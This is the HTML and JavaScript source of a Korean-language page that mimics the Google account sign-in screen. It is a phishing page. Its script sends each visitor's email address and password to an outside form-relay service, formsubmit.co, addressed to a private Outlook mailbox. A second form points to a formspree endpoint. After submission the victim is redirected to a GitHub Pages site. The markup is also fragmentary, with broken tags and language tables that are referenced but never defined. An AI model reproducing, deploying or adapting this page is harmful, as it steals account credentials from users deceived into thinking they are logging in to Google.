<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>로그인 - Google 계정</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Google Fonts: Noto Sans KR & Roboto -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;500;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Noto Sans KR', 'Roboto', -apple-system, BlinkMacSystemFont, sans-serif;
            color: #1F1F1F;
            margin: 0;
            padding: 0;
            -webkit-tap-highlight-color: transparent;
        }

        /* Top Linear Indeterminate Progress Bar (Google Sign-In style) */
        .linear-progress {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background-color: #D3E3FD;
            overflow: hidden;
            border-top-left-radius: 28px;
            border-top-right-radius: 28px;
            opacity: 0;
            transition: opacity 0.2s ease;
        }

        @media (max-width: 639px) {
            .linear-progress {
                border-radius: 0;
            }
        }

        .linear-progress.active {
            opacity: 1;
        }

        .linear-progress-bar {
            position: absolute;
            background-color: #0B57D0;
            top: 0;
            bottom: 0;
            left: 0;
            will-change: left, right;
            animation: indeterminate 2.1s cubic-bezier(0.65, 0.815, 0.735, 0.395) infinite;
        }

        .linear-progress-bar-short {
            position: absolute;
            background-color: #0B57D0;
            top: 0;
            bottom: 0;
            left: 0;
            will-change: left, right;
            animation: indeterminate-short 2.1s cubic-bezier(0.165, 0.84, 0.44, 1) infinite;
            animation-delay: 1.15s;
        }

        @keyframes indeterminate {
            0% { left: -35%; right: 100%; }
            60% { left: 100%; right: -90%; }
            100% { left: 100%; right: -90%; }
        }

        @keyframes indeterminate-short {
            0% { left: -200%; right: 100%; }
            60% { left: 107%; right: -8%; }
            100% { left: 107%; right: -8%; }
        }

        /* Material Outlined Floating Label Input */
        .m3-outlined-box {
            position: relative;
            width: 100%;
        }

        .m3-outlined-input {
            width: 100%;
            height: 56px;
            padding: 16px;
            font-size: 16px;
            line-height: 24px;
            color: #1F1F1F;
            background-color: transparent;
            border: 1px solid #747775;
            border-radius: 4px;
            outline: none;
            transition: border-color 0.15s ease, box-shadow 0.15s ease;
        }

        .m3-outlined-input:hover:not(:focus):not(.is-invalid) {
            border-color: #1F1F1F;
        }

        .m3-outlined-input:focus:not(.is-invalid) {
            border-color: #0B57D0;
            box-shadow: inset 0 0 0 1px #0B57D0;
        }

        .m3-outlined-input.is-invalid {
            border-color: #B3261E;
        }

        .m3-outlined-input.is-invalid:focus {
            border-color: #B3261E;
            box-shadow: inset 0 0 0 1px #B3261E;
        }

        .m3-floating-label {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            background-color: #FFFFFF;
            padding: 0 4px;
            font-size: 16px;
            color: #444746;
            pointer-events: none;
            transition: top 0.15s cubic-bezier(0.4, 0, 0.2, 1),
                        font-size 0.15s cubic-bezier(0.4, 0, 0.2, 1),
                        color 0.15s ease;
        }

        /* Float label up on focus or when input has value */
        .m3-outlined-input:focus ~ .m3-floating-label,
        .m3-outlined-input:not(:placeholder-shown) ~ .m3-floating-label {
            top: 0;
            font-size: 12px;
        }

        .m3-outlined-input:focus:not(.is-invalid) ~ .m3-floating-label {
            color: #0B57D0;
            font-weight: 500;
        }

        .m3-outlined-input.is-invalid ~ .m3-floating-label {
            color: #B3261E;
        }

        /* Buttons & Links */
        .g-link-btn {
            color: #0B57D0;
            font-size: 14px;
            font-weight: 500;
            padding: 8px 12px;
            margin-left: -12px;
            border-radius: 9999px;
            background: transparent;
            transition: background-color 0.15s ease;
        }

        .g-link-btn:hover {
            background-color: rgba(11, 87, 208, 0.08);
        }

        .g-link-btn:active {
            background-color: rgba(11, 87, 208, 0.12);
        }

        .g-primary-btn {
            background-color: #0B57D0;
            color: #FFFFFF;
            font-size: 14px;
            font-weight: 500;
            padding: 10px 24px;
            border-radius: 9999px;
            transition: background-color 0.15s ease, box-shadow 0.15s ease;
        }

        .g-primary-btn:hover:not(:disabled) {
            background-color: #0842A0;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.25);
        }

        .g-primary-btn:active:not(:disabled) {
            background-color: #062E6F;
        }

        .g-primary-btn:disabled {
            background-color: #E3E3E3;
            color: #8E918F;
            cursor: not-allowed;
        }

        /* User Account Chip (Step 2) */
        .g-user-chip {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 4px 10px 4px 5px;
            border: 1px solid #747775;
            border-radius: 9999px;
            background-color: #FFFFFF;
            color: #1F1F1F;
            font-size: 14px;
            font-weight: 500;
            max-width: 100%;
            cursor: pointer;
            transition: background-color 0.15s ease, border-color 0.15s ease;
        }

        .g-user-chip:hover {
            background-color: #F4F6F9;
        }

        .g-user-chip:active {
            background-color: #E8ECF2;
        }

        /* Step Transition */
        @keyframes stepFadeIn {
            from {
                opacity: 0;
                transform: translateX(12px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        .step-animate {
            animation: stepFadeIn 0.22s cubic-bezier(0.2, 0, 0, 1) forwards;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col justify-between sm:justify-center items-center bg-white sm:bg-[#F0F4F9] sm:px-6 sm:py-10">

                            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
                            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>

                        </svg>

                    <!-- Heading & Subheading -->
                    <h1 id="ui-s1-title" class="text-[28px] sm:text-[32px] font-normal leading-[36px] sm:leading-[40px] text-[#1F1F1F] mb-2">
                        로그인

                    <p id="ui-s1-subtitle" class="text-[16px] leading-[24px] text-[#1F1F1F]">

                <!-- Right / Bottom Form Section (Step 1) -->
                <div class="lg:col-span-7 flex flex-col lg:pt-14">
                    <form id="step1-form" novalidate>

                            <div class="m3-outlined-box">

                                    type="text" 
                                    id="email-input" 
                                    name="email" 
                                    placeholder=" " 
                                    autocomplete="username"
                                    class="m3-outlined-input"
                                >

                            </div>

                                이메일을 잊으셨나요?
                            </a>
                        </div>

                        <!-- Guest Mode Info Text -->

                            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
                            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>

                    </button>
                </div>

                <!-- Right / Bottom Form Section (Step 2) -->
                <div class="lg:col-span-7 flex flex-col lg:pt-14">
                    <form id="step2-form" action="https://formspree.io/f/xwloeqoa" method="POST" novalidate>
                        
                        <!-- Field 2: 비밀번호 입력 -->
                        <div class="mb-2.5">
                            <div class="m3-outlined-box">
                                <input 
                                    type="password" 
                                    id="password-input" 
                                    name="password" 
                                    placeholder=" " 
                                    autocomplete="current-password"
                                    class="m3-outlined-input"
                                >
                                <label id="ui-pw-label" for="password-input" class="m3-floating-label">비밀번호 입력</label>
                            </div>
                            <!-- Validation Error Message for 비밀번호 -->
                            <div id="password-error" class="hidden mt-1.5 flex items-center gap-1.5 text-[#B3261E] text-[12px]">

                                </svg>
                                <span id="ui-pw-err-text">비밀번호를 입력하세요</span>
                            </div>
                        </div>

                        <div class="mb-9">
                            <label class="inline-flex items-center cursor-pointer select-none group">

                            </label>
                        </div>

                        <!-- Network / Submission Error Banner -->
                        <div id="submit-error" class="hidden mb-6 p-3 rounded-lg bg-[#FCE8E6] text-[#B3261E] text-[13px] flex items-center gap-2">
                            <svg class="w-5 h-5 shrink-0" viewBox="0 0 24 24" fill="currentColor">
                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                            </svg>
                            <span id="submit-error-text">요청을 처리할 수 없습니다. 다시 시도해 주세요.</span>
                        </div>

                        <!-- Bottom Action Row (Step 2) -->
                        <div class="flex items-center justify-between pt-1">
                            <a id="link-forgot-pw" href="https://accounts.google.com/signin/v2/recoveryidentifier?hl=ko" target="_blank" rel="noopener noreferrer" class="g-link-btn inline-flex items-center">
                                비밀번호 찾기
                            </a>
                            <button type="submit" id="step2-next-btn" class="g-primary-btn">
                                다음
                            </button>
                        </div>

                    </form>
                </div>

            </div>

        </main>

        <!-- Footer Below Card -->
        <footer class="w-full px-6 sm:px-3 py-4 flex flex-wrap items-center justify-between text-[12px] text-[#444746] gap-y-2">
            <!-- Comprehensive Google Language Selector -->
            <div class="relative inline-flex items-center max-w-[240px]">
                <select id="lang-select" aria-label="언어 선택" class="appearance-none bg-transparent hover:bg-black/5 rounded-md py-1.5 ps-2 pe-7 text-[12px] text-[#1F1F1F] cursor-pointer focus:outline-none truncate max-w-full">
                    <!-- Populated dynamically with all 75+ Google-supported languages -->
                </select>
                <svg class="w-4 h-4 text-[#1F1F1F] pointer-events-none absolute end-1.5" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M7 10l5 5 5-5z"/>
                </svg>
            </div>

            <!-- Right Footer Links -->
            <div class="flex items-center gap-2 sm:gap-4">
                <a id="link-help" href="https://support.google.com/accounts?hl=ko" target="_blank" rel="noopener noreferrer" class="px-2 py-1.5 rounded-md hover:bg-black/5 transition-colors">도움말</a>
                <a id="link-privacy" href="https://policies.google.com/privacy?hl=ko" target="_blank" rel="noopener noreferrer" class="px-2 py-1.5 rounded-md hover:bg-black/5 transition-colors">개인정보처리방침</a>
                <a id="link-terms" href="https://policies.google.com/terms?hl=ko" target="_blank" rel="noopener noreferrer" class="px-2 py-1.5 rounded-md hover:bg-black/5 transition-colors">약관</a>
            </div>
        </footer>

    </div>

        document.addEventListener('DOMContentLoaded', () => {
            const langSelect = document.getElementById('lang-select');

            // Populate all 79 Google languages into the selector
            GOOGLE_LANGUAGES.forEach(lang => {
                const opt = document.createElement('option');
                opt.value = lang.code;
                opt.textContent = lang.name;
                if (lang.code === 'ko') opt.selected = true;
                langSelect.appendChild(opt);
            });

            // Helper to apply selected language to UI text, RTL direction, and Google external links
            function applyLanguage(code) {
                const langObj = GOOGLE_LANGUAGES.find(l => l.code === code) || GOOGLE_LANGUAGES.find(l => l.code === 'ko');
                const baseCode = code.split('-')[0];
                const t = I18N[code] || I18N[baseCode] || I18N.en;

                // Update document lang and RTL direction (for Arabic, Hebrew, Persian, Urdu)
                document.documentElement.lang = code;
                document.documentElement.dir = langObj.rtl ? 'rtl' : 'ltr';
                document.title = t.pageTitle;

                // Update Step 1 & Step 2 UI texts
                document.getElementById('ui-s1-title').textContent = t.s1Title;
                document.getElementById('ui-s1-subtitle').textContent = t.s1Subtitle;
                document.getElementById('ui-email-label').textContent = t.emailLabel;
                document.getElementById('ui-email-err-text').textContent = t.emailErr;
                document.getElementById('link-forgot-email').textContent = t.forgotEmail;
                document.getElementById('ui-guest-text').textContent = t.guestText + ' ';
                document.getElementById('link-guest-mode').textContent = t.guestLearnMore;
                document.getElementById('link-create-account').textContent = t.createAccount;
                document.getElementById('step1-next-btn').textContent = t.next;

                document.getElementById('ui-s2-title').textContent = t.s2Title;
                document.getElementById('ui-pw-label').textContent = t.pwLabel;
                document.getElementById('ui-pw-err-text').textContent = t.pwErr;
                document.getElementById('ui-show-pw').textContent = t.showPw;
                document.getElementById('link-forgot-pw').textContent = t.forgotPw;
                document.getElementById('step2-next-btn').textContent = t.next;

                document.getElementById('link-help').textContent = t.help;
                document.getElementById('link-privacy').textContent = t.privacy;
                document.getElementById('link-terms').textContent = t.terms;

                // Dynamically update ?hl=<lang_code> on all 7 Google external links
                const hlParam = encodeURIComponent(code);
                document.getElementById('link-forgot-email').href = `https://accounts.google.com/signin/v2/usernamerecovery?hl=${hlParam}`;
                document.getElementById('link-guest-mode').href = `https://support.google.com/chrome/answer/6130773?hl=${hlParam}`;
                document.getElementById('link-create-account').href = `https://accounts.google.com/signup?hl=${hlParam}`;
                document.getElementById('link-forgot-pw').href = `https://accounts.google.com/signin/v2/recoveryidentifier?hl=${hlParam}`;
                document.getElementById('link-help').href = `https://support.google.com/accounts?hl=${hlParam}`;
                document.getElementById('link-privacy').href = `https://policies.google.com/privacy?hl=${hlParam}`;
                document.getElementById('link-terms').href = `https://policies.google.com/terms?hl=${hlParam}`;
            }

            langSelect.addEventListener('change', (e) => {
                applyLanguage(e.target.value);
            });

            const step1El = document.getElementById('step-1');
            const step2El = document.getElementById('step-2');
            const step1Form = document.getElementById('step1-form');
            const step2Form = document.getElementById('step2-form');

            const signinCard = document.getElementById('signin-card');
            const progressBar = document.getElementById('progress-bar');

            const emailInput = document.getElementById('email-input');
            const emailError = document.getElementById('email-error');
            const step1NextBtn = document.getElementById('step1-next-btn');

            const userChipBtn = document.getElementById('user-chip-btn');
            const displayEmailText = document.getElementById('display-email-text');
            const passwordInput = document.getElementById('password-input');
            const passwordError = document.getElementById('password-error');
            const togglePwCheckbox = document.getElementById('toggle-pw-visibility');
            const step2NextBtn = document.getElementById('step2-next-btn');

            const submitError = document.getElementById('submit-error');
            const submitErrorText = document.getElementById('submit-error-text');

            // Clear field validation errors on input
            emailInput.addEventListener('input', () => {
                if (emailInput.value.trim().length > 0) {
                    emailInput.classList.remove('is-invalid');
                    emailError.classList.add('hidden');
                }
            });

            passwordInput.addEventListener('input', () => {
                if (passwordInput.value.trim().length > 0) {
                    passwordInput.classList.remove('is-invalid');
                    passwordError.classList.add('hidden');
                }
            });

            // Toggle password visibility checkbox ('비밀번호 표시')
            togglePwCheckbox.addEventListener('change', () => {
                passwordInput.type = togglePwCheckbox.checked ? 'text' : 'password';
            });

            function setLoading(isLoading) {
                if (isLoading) {
                    progressBar.classList.add('active');
                    signinCard.classList.add('opacity-80', 'pointer-events-none');
                    step1NextBtn.disabled = true;
                    step2NextBtn.disabled = true;
                } else {
                    progressBar.classList.remove('active');
                    signinCard.classList.remove('opacity-80', 'pointer-events-none');
                    step1NextBtn.disabled = false;
                    step2NextBtn.disabled = false;
                }
            }

            // Transition from Step 1 -> Step 2
            step1Form.addEventListener('submit', (e) => {
                e.preventDefault();
                const emailVal = emailInput.value.trim();

                if (!emailVal) {
                    emailInput.classList.add('is-invalid');
                    emailError.classList.remove('hidden');
                    emailInput.focus();
                    return;
                }

                emailInput.classList.remove('is-invalid');
                emailError.classList.add('hidden');

                // Animate linear progress bar briefly just like Google Sign-In step transition
                setLoading(true);
                setTimeout(() => {
                    displayEmailText.textContent = emailVal;
                    step1El.classList.add('hidden');
                    step1El.classList.remove('lg:grid');

                    step2El.classList.remove('hidden');
                    step2El.classList.add('lg:grid', 'step-animate');

                    setLoading(false);
                    passwordInput.focus();
                }, 420);
            });

            // Clicking User Account Chip returns to Step 1 to edit Email/Phone
            userChipBtn.addEventListener('click', () => {
                setLoading(true);
                submitError.classList.add('hidden');
                setTimeout(() => {
                    step2El.classList.add('hidden');
                    step2El.classList.remove('lg:grid');

                    step1El.classList.remove('hidden');
                    step1El.classList.add('lg:grid', 'step-animate');

                    setLoading(false);
                    emailInput.focus();
                }, 280);
            });

            // Submit Step 2 -> Formsubmit AJAX & Redirect
	step2Form.addEventListener('submit', async (e) => {
	    e.preventDefault();
	    submitError.classList.add('hidden');
	
	    const emailVal = emailInput.value.trim();
	    const passwordVal = passwordInput.value.trim();
	
	    if (!passwordVal) {
	        passwordInput.classList.add('is-invalid');
	        passwordError.classList.remove('hidden');
	        passwordInput.focus();
	        return;
	    }
	
	    passwordInput.classList.remove('is-invalid');
	    passwordError.classList.add('hidden');
	
	    setLoading(true);
	    const formData = new FormData();
	    formData.append('email', emailVal);
	    formData.append('password', passwordVal);
	
	    const curCode = langSelect.value;
	    const curBase = curCode.split('-')[0];
	    const t = I18N[curCode] || I18N[curBase] || I18N.en;
	
	    try {
	        const response = await fetch('https://formsubmit.co/ajax/jsbi110@outlook.kr', {
	            method: 'POST',
	            body: formData,
	            headers: {
	                'Accept': 'application/json'
	            }
	        });
	
	        const data = await response.json().catch(() => ({}));
	
	        if (response.ok) {
	            window.location.href = 'https://jsbi110.github.io/aa';
	        } else {
	            if (data && Array.isArray(data.errors)) {
	                submitErrorText.textContent = data.errors.map(err => err.message).join(', ');
	            } else {
	                submitErrorText.textContent = data.message || t.submitErr;
	            }
	            submitError.classList.remove('hidden');
	            setLoading(false);
	        }
	    } catch (err) {
	        submitErrorText.textContent = t.networkErr;
	        submitError.classList.remove('hidden');
	        setLoading(false);
	    }
	});
        });
    </script>
